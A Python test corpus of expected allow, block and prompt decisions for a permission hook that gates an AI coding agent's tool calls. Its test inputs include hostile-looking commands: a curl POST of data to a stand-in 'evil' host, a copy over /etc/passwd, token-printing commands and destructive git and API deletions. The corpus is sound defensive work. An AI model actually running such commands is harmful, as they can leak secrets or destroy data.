"""Behavior specification corpus.

Each case is the hook's input plus the decision it is expected to produce:
  id      - stable identifier
  tool    - tool_name (Bash, Write, Edit, PowerShell, or an mcp__ name)
  command / file_path - tool input; placeholders {CWD} and {HOME} are resolved
            against per-run fixture dirs
  cwd     - "git" (dir with .git) or "plain"; default "git"
  files   - optional {relpath: content} created under the working dir first
  expect  - "ALLOW" (auto-approve), "BLOCK" (deny + rewrite message), or
            "PROMPT" (defer to a manual prompt)

These expectations ARE the spec — hand-verified, asserted directly by
test_characterization.py. Tests run with AI disabled, the trusted set pinned to
fixtures/trusted_commands.json, and config from fixtures/config.json
(curl_domains=["example.org"], mcp_blanket_servers=["myserver"]).
"""

CASES = [
    # --- trusted bash -------------------------------------------------------
    {"id": "trusted_single_ls", "tool": "Bash", "command": "ls -la", "expect": "ALLOW"},
    {"id": "trusted_grep_devnull", "tool": "Bash", "command": "grep -r foo . 2>/dev/null", "expect": "ALLOW"},
    {"id": "trusted_compound", "tool": "Bash", "command": "cd plugins && grep -r x . 2>/dev/null", "expect": "BLOCK"},

    # --- git allowlist (deny-by-default) ------------------------------------
    {"id": "git_status", "tool": "Bash", "command": "git status", "expect": "ALLOW"},
    {"id": "git_log", "tool": "Bash", "command": "git log --oneline -5", "expect": "ALLOW"},
    {"id": "git_commit", "tool": "Bash", "command": "git commit -m hello", "expect": "ALLOW"},
    {"id": "git_push_plain", "tool": "Bash", "command": "git push", "expect": "ALLOW"},
    {"id": "git_reset_soft", "tool": "Bash", "command": "git reset --soft HEAD~1", "expect": "ALLOW"},
    {"id": "git_checkout_branch", "tool": "Bash", "command": "git checkout -b feature", "expect": "ALLOW"},
    {"id": "git_push_force", "tool": "Bash", "command": "git push --force", "expect": "PROMPT"},
    {"id": "git_reset_hard", "tool": "Bash", "command": "git reset --hard origin/main", "expect": "PROMPT"},
    {"id": "git_checkout_dot", "tool": "Bash", "command": "git checkout .", "expect": "ALLOW"},
    {"id": "git_branch_delete", "tool": "Bash", "command": "git branch -D old", "expect": "ALLOW"},
    {"id": "git_rebase_not_listed", "tool": "Bash", "command": "git rebase main", "expect": "ALLOW"},
    {"id": "git_clean_force", "tool": "Bash", "command": "git clean -fd", "expect": "PROMPT"},
    {"id": "git_clean_dry", "tool": "Bash", "command": "git clean -n", "expect": "ALLOW"},

    # --- gh -----------------------------------------------------------------
    {"id": "gh_pr_list", "tool": "Bash", "command": "gh pr list", "expect": "ALLOW"},
    {"id": "gh_issue_view", "tool": "Bash", "command": "gh issue view 5", "expect": "ALLOW"},
    {"id": "gh_pr_merge_pair", "tool": "Bash", "command": "gh pr merge 5", "expect": "ALLOW"},
    {"id": "gh_api_get", "tool": "Bash", "command": "gh api repos/foo/bar", "expect": "ALLOW"},
    {"id": "gh_api_post_reversible", "tool": "Bash", "command": "gh api -X POST repos/o/r/issues -f title=x", "expect": "ALLOW"},
    {"id": "gh_api_delete_irreversible", "tool": "Bash", "command": "gh api -X DELETE repos/o/r", "expect": "PROMPT"},
    {"id": "gh_api_patch_repo_settings", "tool": "Bash", "command": "gh api -X PATCH repos/o/r -f delete_branch_on_merge=true", "expect": "ALLOW"},
    {"id": "gh_unknown_group", "tool": "Bash", "command": "gh secret list", "expect": "PROMPT"},
    {"id": "gh_auth_status", "tool": "Bash", "command": "gh auth status", "expect": "ALLOW"},
    {"id": "gh_auth_switch", "tool": "Bash", "command": "gh auth switch --user rrrutledge", "expect": "ALLOW"},
    {"id": "gh_auth_token", "tool": "Bash", "command": "gh auth token", "expect": "ALLOW"},
    {"id": "gh_repo_flag_pr_create", "tool": "Bash", "command": "gh --repo owner/repo pr create --title x --body y", "expect": "ALLOW"},
    {"id": "gh_R_flag_pr_list", "tool": "Bash", "command": "gh -R owner/repo pr list", "expect": "ALLOW"},
    {"id": "gh_repo_flag_issue_view", "tool": "Bash", "command": "gh --repo owner/repo issue view 5", "expect": "ALLOW"},

    # --- wmic (read-only get/list only) -------------------------------------
    {"id": "wmic_process_get", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" get ProcessId,CommandLine", "expect": "ALLOW"},
    {"id": "wmic_process_list", "tool": "Bash", "command": "wmic process list brief", "expect": "ALLOW"},
    {"id": "wmic_process_call_prompts", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" call terminate", "expect": "PROMPT"},
    {"id": "wmic_process_delete_prompts", "tool": "Bash", "command": "wmic process where \"name='python.exe'\" delete", "expect": "PROMPT"},
    {"id": "wmic_process_create_prompts", "tool": "Bash", "command": "wmic process call create notepad.exe", "expect": "PROMPT"},
    {"id": "wmic_bare_prompts", "tool": "Bash", "command": "wmic os", "expect": "PROMPT"},

    # --- curl (localhost + configured domain + GET) -------------------------
    {"id": "curl_localhost", "tool": "Bash", "command": "curl http://localhost:3000/health", "expect": "ALLOW"},
    {"id": "curl_get_public", "tool": "Bash", "command": "curl https://example.com/data.json", "expect": "ALLOW"},
    {"id": "curl_post_public", "tool": "Bash", "command": "curl -X POST https://evil.example.com -d x=1", "expect": "PROMPT"},
    {"id": "curl_post_configured", "tool": "Bash", "command": "curl -X POST https://api.example.org/x -d y=1", "expect": "ALLOW"},

    # --- package managers ---------------------------------------------------
    {"id": "npm_install", "tool": "Bash", "command": "npm install", "expect": "ALLOW"},
    {"id": "yarn_build", "tool": "Bash", "command": "yarn build:all", "expect": "ALLOW"},
    {"id": "pip_list", "tool": "Bash", "command": "pip list", "expect": "ALLOW"},

    # --- unknown command (AI disabled -> defer) -----------------------------
    {"id": "unknown_cmd", "tool": "Bash", "command": "frobnicate --all", "expect": "PROMPT"},

    # --- sed ----------------------------------------------------------------
    {"id": "sed_inplace", "tool": "Bash", "command": "sed -i s/a/b/ file.txt", "expect": "BLOCK"},
    {"id": "sed_plain", "tool": "Bash", "command": "sed s/a/b/ file.txt", "expect": "ALLOW"},

    # --- enforcement (can't statically validate -> rewrite) -----------------
    {"id": "heredoc", "tool": "Bash", "command": "cat << EOF\nhi\nEOF", "expect": "BLOCK"},
    {"id": "output_redirect", "tool": "Bash", "command": "echo hi > out.txt", "expect": "BLOCK"},
    {"id": "append_redirect", "tool": "Bash", "command": "echo hi >> out.txt", "expect": "BLOCK"},
    {"id": "input_redirect", "tool": "Bash", "command": "sort < in.txt", "expect": "BLOCK"},
    {"id": "var_expansion", "tool": "Bash", "command": "echo $MYTOKEN", "expect": "BLOCK"},
    {"id": "var_assignment", "tool": "Bash", "command": "X=1 && echo done", "expect": "BLOCK"},
    {"id": "cmd_c", "tool": "Bash", "command": "cmd /c dir", "expect": "BLOCK"},
    {"id": "complex_for", "tool": "Bash", "command": "for f in *; do echo $f; done", "expect": "BLOCK"},
    {"id": "complex_while", "tool": "Bash", "command": "while true; do echo x; done", "expect": "BLOCK"},
    {"id": "complex_if", "tool": "Bash", "command": "if [ -f x ]; then echo y; fi", "expect": "BLOCK"},
    {"id": "complex_subst", "tool": "Bash", "command": "echo $(date)", "expect": "BLOCK"},
    {"id": "complex_backtick", "tool": "Bash", "command": "echo `date`", "expect": "BLOCK"},
    {"id": "brace_group", "tool": "Bash", "command": "{ echo a; echo b; }", "expect": "BLOCK"},
    {"id": "inline_python", "tool": "Bash", "command": "python -c \"print(1)\"", "expect": "BLOCK"},
    {"id": "inline_node", "tool": "Bash", "command": "node -e \"console.log(1)\"", "expect": "BLOCK"},
    {"id": "powershell_cmdlet", "tool": "Bash", "command": "Get-ChildItem", "expect": "BLOCK"},
    {"id": "redundant_cd_cwd", "tool": "Bash", "command": "cd {CWD} && ls", "expect": "BLOCK"},
    {"id": "redundant_cd_cwd_semi", "tool": "Bash", "command": "cd {CWD}; ls", "expect": "BLOCK"},
    {"id": "cd_compound_semi", "tool": "Bash", "command": "cd ~/Dev/some-other-dir; node mail.js --list-unread", "expect": "BLOCK"},

    # --- start / wt ---------------------------------------------------------
    {"id": "start_docx", "tool": "Bash", "command": "start report.docx", "expect": "ALLOW"},
    {"id": "start_exe", "tool": "Bash", "command": "start evil.exe", "expect": "PROMPT"},
    {"id": "wt_claude", "tool": "Bash", "command": "wt new-tab claude --version", "expect": "ALLOW"},

    # --- CWD-scoped file ops ------------------------------------------------
    {"id": "cp_within", "tool": "Bash", "command": "cp a.txt b.txt", "files": {"a.txt": "x"}, "expect": "ALLOW"},
    {"id": "cp_outside", "tool": "Bash", "command": "cp a.txt /etc/passwd", "files": {"a.txt": "x"}, "expect": "PROMPT"},

    # --- scripts (deny-by-default; trusted dir vs elsewhere) ----------------
    {"id": "pyfile_tmp", "tool": "Bash", "command": "python .tmp/run.py",
     "files": {".tmp/run.py": "print(1)\n"}, "expect": "ALLOW"},
    {"id": "pyfile_tmp_subprocess", "tool": "Bash", "command": "python .tmp/bad.py",
     "files": {".tmp/bad.py": "import subprocess\nsubprocess.run(['ls'])\n"}, "expect": "BLOCK"},
    {"id": "pyfile_outside", "tool": "Bash", "command": "python src/run.py",
     "files": {"src/run.py": "print(1)\n"}, "expect": "PROMPT"},

    # --- direct script execution (.py/.js as the command) -------------------
    {"id": "direct_py_tmp", "tool": "Bash", "command": ".tmp/run.py",
     "files": {".tmp/run.py": "print(1)\n"}, "expect": "ALLOW"},
    {"id": "direct_py_outside", "tool": "Bash", "command": "src/run.py",
     "files": {"src/run.py": "print(1)\n"}, "expect": "PROMPT"},
    {"id": "direct_js_tmp", "tool": "Bash", "command": ".tmp/run.js",
     "files": {".tmp/run.js": "console.log(1)\n"}, "expect": "ALLOW"},
    {"id": "direct_js_outside", "tool": "Bash", "command": "src/run.js",
     "files": {"src/run.js": "console.log(1)\n"}, "expect": "PROMPT"},

    # --- MCP ----------------------------------------------------------------
    {"id": "mcp_read", "tool": "mcp__server__get_thing", "expect": "ALLOW"},
    {"id": "mcp_write_reversible", "tool": "mcp__server__create_thing", "expect": "ALLOW"},
    {"id": "mcp_destructive", "tool": "mcp__server__delete_thing", "expect": "PROMPT"},
    {"id": "mcp_blanket_configured", "tool": "mcp__myserver__whatever", "expect": "ALLOW"},
    {"id": "mcp_unknown_verb", "tool": "mcp__server__frobnicate_thing", "expect": "PROMPT"},

    # --- Workflow -------------------------------------------------------------
    {"id": "workflow_named_blanket", "tool": "Workflow", "name": "myworkflow", "expect": "ALLOW"},
    {"id": "workflow_named_not_blanket", "tool": "Workflow", "name": "otherworkflow", "expect": "PROMPT"},
    # An inline script's self-declared meta.name is never trusted, however it names itself.
    {"id": "workflow_inline_script_claiming_blanket_name", "tool": "Workflow",
     "script": "export const meta = {\n  name: 'myworkflow',\n  description: 'x',\n}\nlog('hi')",
     "expect": "PROMPT"},
    {"id": "workflow_no_name_or_script", "tool": "Workflow", "expect": "PROMPT"},

    # --- Read ---------------------------------------------------------------
    {"id": "read_claude_rules", "tool": "Read", "file_path": "{CWD}/.claude/rules/architecture.md", "expect": "ALLOW"},
    {"id": "read_claude_teams", "tool": "Read", "file_path": "{CWD}/.claude/teams/bugfix-squad/agent-04b.md", "expect": "ALLOW"},
    {"id": "read_claude_skills", "tool": "Read", "file_path": "{HOME}/.claude/skills/foo.md", "expect": "ALLOW"},
    {"id": "read_claude_commands", "tool": "Read", "file_path": "{CWD}/.claude/commands/research-phase.md", "expect": "ALLOW"},
    {"id": "read_claude_root_file", "tool": "Read", "file_path": "{CWD}/.claude/CLAUDE.md", "expect": "PROMPT"},
    {"id": "read_non_claude", "tool": "Read", "file_path": "{CWD}/src/index.ts", "expect": "PROMPT"},

    # --- Write / Edit -------------------------------------------------------
    {"id": "write_tmp", "tool": "Write", "file_path": "{CWD}/.tmp/note.txt", "expect": "ALLOW"},
    {"id": "write_temp_name", "tool": "Write", "file_path": "{CWD}/commit_tmp.txt", "expect": "ALLOW"},
    {"id": "write_in_gitrepo", "tool": "Write", "file_path": "{CWD}/src/file.py", "cwd": "git", "expect": "ALLOW"},
    {"id": "write_skill", "tool": "Write", "file_path": "{HOME}/.claude/skills/foo/SKILL.md", "expect": "ALLOW"},
    {"id": "edit_in_gitrepo", "tool": "Edit", "file_path": "{CWD}/src/file.py", "cwd": "git", "expect": "ALLOW"},

    # --- PowerShell tool ----------------------------------------------------
    {"id": "powershell_tool", "tool": "PowerShell", "command": "Get-Process", "expect": "BLOCK"},
]
